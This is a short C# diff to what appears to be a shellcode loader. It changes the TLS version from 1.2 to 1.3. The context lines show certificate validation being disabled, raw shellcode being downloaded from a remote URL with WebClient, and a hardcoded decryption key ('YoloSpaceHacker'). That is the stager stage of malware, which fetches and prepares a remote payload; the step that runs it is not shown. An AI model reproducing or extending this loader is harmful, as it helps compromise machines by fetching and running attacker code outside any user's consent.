@@ -15,7 +15,9 @@ public class Program
   {
     WebClient wc = new WebClient();
     ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
-    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+
+    //ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls13;
 
     byte[] shellcode = wc.DownloadData(url);
     byte[] keyBytes = Encoding.ASCII.GetBytes("YoloSpaceHacker");
